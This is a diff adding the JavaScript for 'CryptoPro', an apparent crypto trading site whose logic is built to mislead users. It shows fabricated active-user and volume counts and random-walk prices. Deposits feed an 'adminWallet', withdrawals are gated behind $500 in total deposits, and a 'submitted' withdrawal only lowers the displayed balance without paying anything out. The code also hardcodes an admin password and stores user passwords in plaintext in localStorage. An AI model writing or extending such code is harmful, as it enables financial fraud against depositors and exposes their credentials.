@@ -1,0 +1,283 @@
+console.log('Loading CryptoPro...');
+
+const CONFIG = {
+    ADMIN_PASSWORD: 'admin123',
+    MINIMUM_DEPOSIT: 10,
+    MINIMUM_BALANCE_FOR_TRADING: 50,
+    MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL: 500,
+    ENABLE_TRADING_ROBOTS: true,
+    ROBOT_TRADE_INTERVAL: 15000,
+    ENABLE_PLATFORM_SIMULATION: true,
+    PLATFORM_TRADE_INTERVAL: 3000,
+    BASE_ACTIVE_USERS: 1247,
+    BASE_24H_VOLUME: 97500000
+};
+
+let appState = {
+    currentUser: null,
+    accountType: 'demo',
+    demoBalance: 10000,
+    realBalance: 0,
+    displayBalance: 0,
+    adminWallet: 0,
+    userTotalDeposited: 0,
+    selectedBot: 'none',
+    availableBots: {
+        none: { name: 'Manual', icon: '👤', profitRate: 0 },
+        aggressive: { name: 'Aggressive', icon: '🚀', profitRate: 0.85, minProfit: 20, maxProfit: 80 }
+    },
+    activeUsers: 1247,
+    volume24h: 97500000
+};
+
+let cryptoPrices = { 'BTC/USDT': 64250, 'ETH/USDT': 3420, 'SOL/USDT': 145, 'BNB/USDT': 580, 'DOGE/USDT': 0.08, 'XAU/USDT': 2045 };
+
+document.addEventListener('DOMContentLoaded', init);
+
+function init() {
+    console.log('✅ CryptoPro Loaded');
+    checkAuth();
+    setupListeners();
+}
+
+function checkAuth() {
+    const user = localStorage.getItem('cryptoProUser');
+    if (user) {
+        appState.currentUser = JSON.parse(user);
+        loadState();
+        showMainApp();
+    } else {
+        showAuthScreen();
+    }
+}
+
+function showAuthScreen() {
+    document.getElementById('authScreen').style.display = 'flex';
+    document.getElementById('mainApp').style.display = 'none';
+}
+
+function showMainApp() {
+    document.getElementById('authScreen').style.display = 'none';
+    document.getElementById('mainApp').style.display = 'block';
+    updateUI();
+    startUpdates();
+}
+
+function setupListeners() {
+    // Auth
+    let isSignup = true;
+    document.getElementById('signupTab').onclick = () => {
+        isSignup = true;
+        document.getElementById('signupTab').classList.add('active');
+        document.getElementById('loginTab').classList.remove('active');
+        document.getElementById('nameField').style.display = 'block';
+        document.getElementById('confirmPasswordField').style.display = 'block';
+        document.getElementById('authTitle').textContent = 'Create Account';
+    };
+    
+    document.getElementById('loginTab').onclick = () => {
+        isSignup = false;
+        document.getElementById('loginTab').classList.add('active');
+        document.getElementById('signupTab').classList.remove('active');
+        document.getElementById('nameField').style.display = 'none';
+        document.getElementById('confirmPasswordField').style.display = 'none';
+        document.getElementById('authTitle').textContent = 'Welcome Back';
+    };
+    
+    document.getElementById('authForm').onsubmit = (e) => {
+        e.preventDefault();
+        const email = document.getElementById('authEmail').value;
+        const password = document.getElementById('authPassword').value;
+        
+        if (isSignup) {
+            const name = document.getElementById('signupName').value;
+            const confirm = document.getElementById('confirmPassword').value;
+            if (password !== confirm) { alert('❌ Passwords do not match!'); return; }
+            const user = { name, email, password };
+            localStorage.setItem('cryptoProUser', JSON.stringify(user));
+            appState.currentUser = user;
+            alert(`✅ Account Created! Welcome ${name}!`);
+            showMainApp();
+        } else {
+            const saved = localStorage.getItem('cryptoProUser');
+            if (!saved) { alert('❌ No account! Sign up first.'); return; }
+            const user = JSON.parse(saved);
+            if (user.email === email && user.password === password) {
+                appState.currentUser = user;
+                alert(`✅ Welcome back, ${user.name}!`);
+                showMainApp();
+            } else {
+                alert('❌ Invalid credentials!');
+            }
+        }
+    };
+    
+    // Main app
+    document.getElementById('demoBtn').onclick = () => switchAccount('demo');
+    document.getElementById('realBtn').onclick = () => switchAccount('real');
+    document.getElementById('depositBtn').onclick = openDeposit;
+    document.getElementById('withdrawBtn').onclick = openWithdraw;
+    document.getElementById('tradeBtn').onclick = () => openTrade('BTC/USDT');
+    document.getElementById('botBtn').onclick = openBotModal;
+    document.getElementById('logoutBtn').onclick = () => {
+        if (confirm('Logout?')) {
+            saveState();
+            appState.currentUser = null;
+            showAuthScreen();
+        }
+    };
+}
+
+function switchAccount(type) {
+    appState.accountType = type;
+    document.getElementById('demoBtn').classList.toggle('active', type === 'demo');
+    document.getElementById('realBtn').classList.toggle('active', type === 'real');
+    saveState();
+    updateUI();
+}
+
+function openDeposit() {
+    if (appState.accountType === 'demo') {
+        if (confirm('Switch to REAL?')) { switchAccount('real'); setTimeout(openDeposit, 300); }
+        return;
+    }
+    const m = makeModal('depositModal', '💰 Deposit', `
+        <div class="info-box"><strong>⚡ INSTANT DEPOSIT</strong></div>
+        <div class="form-group"><label>Amount (USD)</label><input type="number" id="dAmount" min="10" step="0.01"></div>
+        <div class="form-group"><label>Method</label><select id="dMethod"><option>BTC</option><option>ETH</option><option>USDT</option></select></div>
+        <div class="form-group"><label>Reference</label><input type="text" id="dRef"></div>
+        <button class="btn btn-primary btn-full" onclick="processDeposit()">CONFIRM</button>
+    `);
+    document.body.appendChild(m);
+}
+
+function processDeposit() {
+    const amt = parseFloat(document.getElementById('dAmount').value);
+    const ref = document.getElementById('dRef').value;
+    if (!amt || amt < 10 || !ref) { alert('❌ Complete all fields'); return; }
+    appState.displayBalance += amt;
+    appState.realBalance += amt;
+    appState.adminWallet += amt;
+    appState.userTotalDeposited += amt;
+    saveState();
+    updateUI();
+    closeModal('depositModal');
+    alert(`✅ DEPOSIT SUCCESS!\n\n$$${amt.toFixed(2)}\nRef: ${ref}\n\nBalance: $$${appState.displayBalance.toFixed(2)}`);
+}
+
+function openWithdraw() {
+    if (appState.accountType === 'demo') { alert('Switch to REAL'); return; }
+    if (appState.displayBalance < 10) { alert('❌ Insufficient'); return; }
+    if (appState.userTotalDeposited < CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL) {
+        alert(`❌ Deposit $$${CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL} total first`);
+        return;
+    }
+    const m = makeModal('withdrawModal', '💸 Withdraw', `
+        <div class="info-box">Available: $$${appState.displayBalance.toFixed(2)}</div>
+        <div class="form-group"><label>Amount</label><input type="number" id="wAmount" min="10"></div>
+        <button class="btn btn-primary btn-full" onclick="processWithdraw()">SUBMIT</button>
+    `);
+    document.body.appendChild(m);
+}
+
+function processWithdraw() {
+    const amt = parseFloat(document.getElementById('wAmount').value);
+    if (!amt || amt < 10) { alert('❌ Min $10'); return; }
+    if (amt > appState.displayBalance) { alert('❌ Insufficient'); return; }
+    appState.displayBalance -= amt;
+    saveState();
+    updateUI();
+    closeModal('withdrawModal');
+    alert(`✅ Withdrawal submitted!\n\n$$${amt.toFixed(2)}\n⏱️ 1-3 days`);
+}
+
+function openTrade(pair) {
+    const bal = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;
+    const m = makeModal('tradeModal', `📊 Trade ${pair}`, `
+        <div class="info-box">Balance: $$${bal.toFixed(2)}</div>
+        <div class="form-group"><label>Amount</label><input type="number" id="tAmount" min="10"></div>
+        <button class="btn btn-primary btn-full" onclick="executeTrade('${pair}')">EXECUTE</button>
+    `);
+    document.body.appendChild(m);
+}
+
+function executeTrade(pair) {
+    const amt = parseFloat(document.getElementById('tAmount').value);
+    if (!amt || amt < 10) { alert('❌ Min $10'); return; }
+    if (appState.accountType === 'demo') appState.demoBalance -= amt;
+    else appState.displayBalance -= amt;
+    saveState();
+    updateUI();
+    closeModal('tradeModal');
+    alert(`✅ Trade executed!\n\n${pair}\n$$${amt.toFixed(2)}`);
+}
+
+function openBotModal() {
+    const bots = Object.keys(appState.availableBots).map(k => {
+        const b = appState.availableBots[k];
+        return `<div class="bot-card" onclick="selectBot('${k}')">${b.icon} ${b.name}</div>`;
+    }).join('');
+    const m = makeModal('botModal', '🤖 Select Bot', bots + '<button class="btn btn-primary btn-full" onclick="closeModal(\'botModal\')">START</button>');
+    document.body.appendChild(m);
+}
+
+function selectBot(k) {
+    appState.selectedBot = k;
+    saveState();
+}
+
+function makeModal(id, title, body) {
+    const m = document.createElement('div');
+    m.className = 'modal active';
+    m.id = id;
+    m.innerHTML = `<div class="modal-content"><div class="modal-header"><h2>${title}</h2><button class="close-btn" onclick="closeModal('${id}')">×</button></div><div class="modal-body">${body}</div></div>`;
+    return m;
+}
+
+function closeModal(id) {
+    const m = document.getElementById(id);
+    if (m) { m.classList.remove('active'); setTimeout(() => m.remove(), 300); }
+}
+
+function updateUI() {
+    const bal = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;
+    document.getElementById('totalBalance').textContent = '$' + bal.toFixed(2);
+    document.getElementById('usdtAmount').textContent = bal.toFixed(2) + ' USDT';
+    document.getElementById('usdtValue').textContent = '$' + bal.toFixed(2);
+    updateStats();
+}
+
+function updateStats() {
+    appState.activeUsers = 1200 + Math.floor(Math.random() * 100);
+    document.getElementById('activeUsersDisplay').textContent = appState.activeUsers.toLocaleString();
+    document.getElementById('volumeDisplay').textContent = '$' + (appState.volume24h / 1000000).toFixed(1) + 'M';
+}
+
+function startUpdates() {
+    setInterval(updatePrices, 2000);
+    setInterval(updateStats, 5000);
+}
+
+function updatePrices() {
+    Object.keys(cryptoPrices).forEach(p => {
+        cryptoPrices[p] += (Math.random() - 0.5) * 50;
+        const el = document.getElementById(p.split('/')[0].toLowerCase() + 'Price');
+        if (el) el.textContent = '$' + cryptoPrices[p].toFixed(2);
+    });
+}
+
+function saveState() {
+    const s = { ...appState };
+    delete s.currentUser;
+    localStorage.setItem('cryptoProState', JSON.stringify(s));
+}
+
+function loadState() {
+    const s = localStorage.getItem('cryptoProState');
+    if (s) {
+        try { appState = { ...appState, ...JSON.parse(s), currentUser: appState.currentUser }; }
+        catch (e) { console.error(e); }
+    }
+}
+
+console.log('✅ CryptoPro Ready');
